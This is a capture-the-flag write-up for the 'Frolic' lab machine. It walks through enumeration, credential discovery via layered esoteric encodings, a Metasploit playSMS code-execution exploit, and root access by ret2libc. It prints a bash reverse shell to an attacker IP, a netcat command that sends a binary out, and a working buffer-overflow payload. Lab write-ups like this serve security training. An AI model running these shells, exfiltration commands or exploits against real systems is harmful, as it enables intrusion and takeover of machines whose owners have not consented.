# frolic

## Information Gathering

Users:
        - sahay
        - ayush

Credentials:
        - admin:imnothuman
        - admin:superduperlooperpassword_lol
        - admin:idkwhatispass

Passwords:
        - idkwhatispass

## Enumerationg

Starting with nmap scan
```s
PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
139/tcp  open  netbios-ssn        Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  etbios-$fAU Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1880/tcp open  http               Node.js (Express middleware)
|_http-title: Node-RED
9999/tcp open  http               nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=9/17%OT=22%CT=1%CU=32084%PV=Y%DS=2%DC=T%G=Y%TM=6507237
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST1
OS:1NW7%O6=M53CST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h49m57s, deviation: 3h10m30s, median: 1s
| smb2-time: 
|   date: 2023-09-17T16:04:12
|_  start_date: N/A
|_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: frolic
|   NetBIOS computer name: FROLIC\x00
|   Domain name: \x00
|   FQDN: frolic
|_  System time: 2023-09-17T21:34:12+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```


### 139/tcp

Software Versioning:
- Samba smbd 3.X - 4.X
- smbd 4.3.11-Ubuntu

Running `smbmap` as anonymous user:
```s
$ smbmap -u '' -p '' -H 10.10.10.111                    
[+] Guest session       IP: 10.10.10.111:445    Name: 10.10.10.111                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (frolic server (Samba, Ubuntu))
```

Sanity check using `smbclient`:
```s
$ smbclient -L \\\\10.10.10.111\\ -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (frolic server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            FROLIC
```

From `enum4linux`:
```s                                                                                                                                            
[+] Server 10.10.10.111 allows sessions using username '', password ''

[+] Got OS info for 10.10.10.111 from srvinfo:                                 
        FROLIC         Wk Sv PrQ Unx NT SNT frolic server (Samba, Ubuntu)
        platform_id     :       500                                            
        os version      :       6.1             
        server type     :       0x809a03

[+] Password Info for Domain: FROLIC

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\sahay (Local User)
S-1-22-1-1001 Unix User\ayush (Local User)

[+] Enumerating users using SID S-1-5-21-3106657666-1405957921-1930463546 and logon username '', password ''

S-1-5-21-3106657666-1405957921-1930463546-501 FROLIC\nobody (Local User)
S-1-5-21-3106657666-1405957921-1930463546-513 FROLIC\None (Domain Group)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
```

From this, we can garner usernames and groups
- Users:
    - sahay
    - ayush
    - nobody
- Groups:
    - Administrators
    - Users
    - Guests
    - Power Users
    - Account Operators
    - Server Operators
    - Print Operators

### 1880/tcp

Software Versioning:
- Express

Banner grabbing:
```s
$ curl -I "http://frolic.htb:1880"  
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 7312
ETag: W/"1c90-2msLZbgbt5dpKWOdY6Gfpk0FcpE"
Date: Sun, 17 Sep 2023 19:07:16 GMT
Connection: keep-alive
```

Running gobuster scan on web server root directory:
```s
$ gobuster dir -u "http://frolic.htb:1880/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o gob/frolic.htb-root.gob
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://frolic.htb:1880/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/09/17 15:05:13 Starting gobuster in directory enumeration mode
===============================================================
/icons                (Status: 401) [Size: 12]
/red                  (Status: 301) [Size: 173] [--> /red/]
/vendor               (Status: 301) [Size: 179] [--> /vendor/]
/settings             (Status: 401) [Size: 12]
/Icons                (Status: 401) [Size: 12]
/nodes                (Status: 401) [Size: 12]
/SETTINGS             (Status: 401) [Size: 12]
/flows                (Status: 401) [Size: 12]
/ICONS                (Status: 401) [Size: 12]
```

### 9999/tcp

Software Versioning:
- nginx/1.10.3
- http://10.10.10.111:9999/playsms/index.php
- playSMS
- [sendfromfile.php?Filename (Authenticated) Code execution](https://www.exploit-db.com/exploits/44599)

Banner grabbing:
```s
$ curl -I "http://10.10.10.111:9999"                
HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Sun, 17 Sep 2023 16:06:02 GMT
Content-Type: text/html
Content-Length: 637
Last-Modified: Sun, 23 Sep 2018 12:03:28 GMT
Connection: keep-alive
ETag: "5ba78110-27d"
Accept-Ranges: bytes
```

Running gobuster scan on web server root directory:
```s
$ gobuster dir -u "http://10.10.10.111:9999/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x html,php,txt,sh,js,bak -o gob/10.10.10.111-root.gob
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.111:9999/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              html,php,txt,sh,js,bak
[+] Timeout:                 10s
===============================================================
2023/09/17 12:07:53 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 178]
/admin                (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/admin/]
/test                 (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/test/]
/dev                  (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/dev/]
/backup               (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/backup/]
/loop                 (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/loop/]
/.html                (Status: 403) [Size: 178]
```

On the "Welcome to nginx" page, there is an indication of a hostname: `http://frolic.htb:1880`

- http://10.10.10.111:9999/admin/
        - login portal with the title stating "c'mon i m hackable"
        - There is a JavaScript file "admin/js/login.js" shows some credentials "admin:superduperlooperpassword_lol"
- http://10.10.10.111:9999/test/
        - Leaks some PHP version information
- http://10.10.10.111:9999/dev/
        - 403 forbidden
- http://10.10.10.111:9999/backup/
        - Shows a directory listing of "password.txt", "user.txt", and "loop/"
        - Viewing http://10.10.10.111:9999/backup/user.txt
                - user - admin
        - Viewing http://10.10.10.111:9999/backup/password.txt
                - password - imnothuman
- http://10.10.10.111:9999/loop/
        - 403 forbidden


### http://10.10.10.111:9999/admin/

Authenticating to http://10.10.10.111:9999/admin/ with the credentials "admin:superduperlooperpassword_lol"
```
..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?. 
```

This looks like the Ook! programming language. Decode with this online [tool](https://www.dcode.fr/ook-language). Returns the string:
```
Nothing here check /asdiSIAJJ0QWE9JAS
```

Navigating to http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS:
```
UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA 
```

Download:
```s
$ curl -s "http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS" -L | base64 -d > blob
$ file blob       
blob: Zip archive data, at least v2.0 to extract, compression method=deflate
```

The zip file was password protected with the password `password`. This decompresses the file `index.php`:
```s
4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
```

Going through a bunch of decoding to get brainkfuck code:
```s
$ cat index.php | xxd -r -p | base64 -di
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
++..<
```

Decoding with [this](https://www.dcode.fr/brainfuck-language) online tool gets me:
```
idkwhatispass
```

### http://10.10.10.111:9999/dev/

Running gobuster scan:
```s
$ gobuster dir -u "http://10.10.10.111:9999/dev/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x html,php,js,txt,bak -o gob/10.10.10.111:9999-dev.gob
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.111:9999/dev/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,js,txt,bak,html
[+] Timeout:                 10s
===============================================================
2023/09/17 15:13:31 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 178]
/test                 (Status: 200) [Size: 5]
/backup               (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/dev/backup/]
/.html                (Status: 403) [Size: 178]
```

Navigating to http://10.10.10.111:9999/dev/backup:
```
/playsms 
```

Navigating to this url gives us `http://10.10.10.111:9999/playsms/index.php?app=main&inc=core_auth&route=login`

Using the previously found credentials `admin:idkwhatispass` authenticates us.


## Foothold

Running [this](https://www.exploit-db.com/exploits/44599) metasploit module with the following settings gets a shell:
```s
msf6 exploit(multi/http/playsms_uploadcsv_exec) > show options
                                                                               
Module options (exploit/multi/http/playsms_uploadcsv_exec):  
                                                                               
   Name       Current Setting  Required  Description                           
   ----       ---------------  --------  -----------            
   PASSWORD   idkwhatispass    yes       Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.111     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      9999             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /playsms/        yes       Base playsms directory path
   USERNAME   admin            yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host
                                                                               
                                                                               
Payload options (php/meterpreter/reverse_tcp):                        
                                                                               
   Name   Current Setting  Required  Description                               
   ----   ---------------  --------  -----------      
   LHOST  10.10.14.22      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port                           
                                                                               
                                                                               
Exploit target:                                                         
                                                                               
   Id  Name                                                  
   --  ----                                                            
   0   PlaySMS 1.4
```

From metasploit shell:
```s
bash -c "bash -i >& /dev/tcp/10.10.14.22/666 0>&1"
```



## Privilege Escalation

Running a linpeas.sh scan gives the SUID binaries
```s
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 38K Mar  6  2017 /sbin/mount.cifs
-rwsr-xr-x 1 root root 34K Dec  1  2017 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 43K May  8  2014 /bin/ping6
-rwsr-xr-x 1 root root 30K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 39K May  8  2014 /bin/ping
-rwsr-xr-x 1 root root 26K Dec  1  2017 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 38K May 17  2017 /bin/su
-rwsr-xr-x 1 root root 154K Jan 28  2017 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
-rwsr-xr-x 1 root root 7.4K Sep 25  2018 /home/ayush/.binary/rop (Unknown SUID binary)
-rwsr-xr-x 1 root root 52K May 17  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 77K May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 34K May 17  2017 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 36K May 17  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 18K Jan 18  2016 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-sr-x 1 daemon daemon 50K Jan 15  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 157K Jul  4  2017 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 36K May 17  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 39K May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 48K May 17  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 14K Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root root 91K Dec  1  2017 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 5.4K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 42K Jun 15  2017 /usr/lib/i386-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 46K Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 502K Jan 18  2018 /usr/lib/openssh/ssh-keysign
```

There is an unknown SUID binary `rop`. I'll transfer it off the machine for further analysis.

```s
# locally
$ nc -lnvp 9001 > rop.b64
# victim
$ base64 rop | nc 10.10.14.25 9001
```

### Analyzing the suid binary locally

After transfering the file off the machine and loading into Ghidra I come across a function `vuln`:
```c

void vuln(char *param_1)

{
  char local_34 [48];
  
  strcpy(local_34,param_1);
  printf("[+] Message sent: ");
  printf(local_34);
  return;
}


```

This function is vulnerable to both buffer overflow and format string vulnerability.

Taking a look at the securities of this application:
```s
$ pwn checksec rop             
[*] 'rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

The only security is NX. The server may also have ASLR enabled.

First objective is to find the offset from the return pointer:
```s
gef➤  pattern offset $esp
[+] Searching for '6e616161'/'6161616e' with period=4
[+] Found at offset 52 (little-endian search) likely
```

We'll need three pieces of information:
1. libc base address
2. system offset
3. /bin/sh offset

First, lets determine the libc base address. We'll also be able to determine if ASLR is enabled on the machine:
```s
www-data@frolic:/home/ayush/.binary$ ldd rop
        linux-gate.so.1 =>  (0xb7fda000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
        /lib/ld-linux.so.2 (0xb7fdb000)
www-data@frolic:/home/ayush/.binary$ ldd rop
        linux-gate.so.1 =>  (0xb7fda000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
        /lib/ld-linux.so.2 (0xb7fdb000)
www-data@frolic:/home/ayush/.binary$
```
LIBC is always loaded into the same memory meaning ASLR is disabled. 

Next, lets get the `system` offset and `/bin/sh` offset:

```s
www-data@frolic:/home/ayush/.binary$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
 15ba0b /bin/sh
www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep "system"
   245: 00112f20    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
```

Now just add the two offsets to the LIBC address and we'll have everything we'll need:

- libc base address: 0xb7e19000
- /bin/sh offset: libc + 0x15ba0b = 0xb7f74a0b
- system offset: libc + 0x0003ada0 = 0xb7e53da0

```
$ ./rop $(python3 -c 'import sys;sys.stdout.buffer.write(b"A" * 52 + b"\xa0\x3d\xe5\xb7" + b"DUMM" + b"\x0b\x4a\xf7\xb7")')
# id
uid=0(root) gid=33(www-data) groups=33(www-data)
#
```

